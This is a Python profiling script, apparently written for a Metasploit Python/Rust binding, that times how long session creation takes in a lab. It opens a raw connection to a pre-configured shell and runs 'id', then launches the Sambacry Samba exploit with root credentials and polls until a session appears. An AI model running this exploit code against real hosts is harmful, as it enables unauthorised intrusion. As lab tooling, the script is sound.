#!/usr/bin/env python3
"""
Profile where session creation time actually goes.

Tests whether the delay is in:
1. Network connection establishment
2. MSF session registration
3. Session initialization
"""

import os
import sys
import time
import socket
import threading

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import assassinate_pyo3 as msf

TARGET_IP = "172.19.0.3"
SHELL_PORT = 4445  # Pre-configured shell
MSF_ROOT = os.path.expanduser("~/Projects/metasploit-framework")


def test_raw_shell_speed():
    """Test raw shell connection without MSF."""
    print("\n" + "="*60)
    print("TEST 1: Raw Shell Connection (no MSF)")
    print("="*60)
    print(f"Connecting to {TARGET_IP}:{SHELL_PORT}...")

    start = time.perf_counter()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)

    try:
        # Connect
        connect_start = time.perf_counter()
        sock.connect((TARGET_IP, SHELL_PORT))
        connect_time = time.perf_counter() - connect_start
        print(f"  Connect: {connect_time*1000:.1f}ms")

        # Send command
        send_start = time.perf_counter()
        sock.sendall(b"id\n")
        send_time = time.perf_counter() - send_start
        print(f"  Send cmd: {send_time*1000:.1f}ms")

        # Receive response
        recv_start = time.perf_counter()
        response = sock.recv(4096)
        recv_time = time.perf_counter() - recv_start
        print(f"  Recv response: {recv_time*1000:.1f}ms")
        print(f"  Response: {response.decode().strip()[:50]}...")

        total = time.perf_counter() - start
        print(f"\n  TOTAL: {total*1000:.1f}ms")
        print("  → Raw shell interaction is INSTANT!")

        sock.close()
        return total

    except Exception as e:
        print(f"  Error: {e}")
        return None


def test_session_polling_granularity():
    """Test how often sessions actually update."""
    print("\n" + "="*60)
    print("TEST 2: Session List Update Frequency")
    print("="*60)

    # We'll trigger an exploit and measure exact timing of when session appears
    cleanup_sessions()

    # Use Sambacry since vsftpd backdoor is now consumed
    m = msf.create_module("exploit/linux/samba/is_known_pipename")
    m.options.RHOSTS = TARGET_IP
    m.options.SMB_SHARE_NAME = "myshare"
    m.options.SMB_USER = "root"
    m.options.SMB_PASS = "root"

    seen = set(msf.list_sessions())
    timestamps = []

    print("Launching exploit and polling rapidly...")
    launch_time = time.perf_counter()
    m._rust.exploit_job("cmd/unix/interact")

    # Poll very rapidly (every 5ms)
    while time.perf_counter() - launch_time < 30:
        poll_time = time.perf_counter()
        current = set(msf.list_sessions())
        new_sessions = current - seen

        if new_sessions:
            detection_time = poll_time - launch_time
            timestamps.append(("SESSION_DETECTED", detection_time))
            print(f"\n  ✓ Session detected at {detection_time*1000:.1f}ms")
            break

        # Very fast polling - 5ms
        msf.sleep_releasing_gvl(5)
        seen = current

    if timestamps:
        print(f"\n  Time from job launch to session detection: {timestamps[0][1]*1000:.0f}ms")
    else:
        print("\n  ✗ No session detected")

    return timestamps


def cleanup_sessions():
    """Kill all sessions."""
    for sid in msf.list_sessions():
        try:
            msf.kill_session(sid)
        except:
            pass
    time.sleep(0.3)


def test_msf_session_via_handler():
    """
    Test session creation via MSF handler to separate:
    1. Handler setup time
    2. Connection acceptance time
    3. Session registration time
    """
    print("\n" + "="*60)
    print("TEST 3: MSF Handler Timing Breakdown")
    print("="*60)

    cleanup_sessions()

    # We'll use the pre-existing shell on 4445 and create a handler
    # Actually, let's just measure how long MSF takes to recognize
    # an incoming connection

    print("This would require setting up a multi/handler...")
    print("Skipping for now - the polling test above gives us the data we need")


def main():
    print("="*60)
    print("SESSION CREATION PROFILER")
    print("="*60)

    print("\nInitializing MSF...")
    msf.init_msf(MSF_ROOT)
    print(f"Version: {msf.framework_version()}")

    # Test 1: Raw shell (baseline - how fast CAN it be?)
    raw_time = test_raw_shell_speed()

    # Test 2: MSF session detection timing
    timestamps = test_session_polling_granularity()

    # Analysis
    print("\n" + "="*60)
    print("ANALYSIS")
    print("="*60)

    if raw_time and timestamps:
        msf_time = timestamps[0][1]
        overhead = msf_time - raw_time if raw_time else msf_time

        print(f"""
  Raw shell RTT:     {raw_time*1000:>7.1f}ms  (Python socket → target shell)
  MSF session time:  {msf_time*1000:>7.1f}ms  (exploit → session detected)

  The difference ({overhead*1000:.0f}ms) is:
  1. Exploit execution (SMB negotiation, payload upload, trigger)
  2. Payload execution on target
  3. Reverse shell connection back to MSF
  4. MSF session registration & initialization

  The ~{msf_time:.1f}s for MSF includes ALL of the above.
  Raw shell is {msf_time/raw_time:.0f}x faster because it skips exploit+payload.
        """)

    cleanup_sessions()


if __name__ == "__main__":
    main()
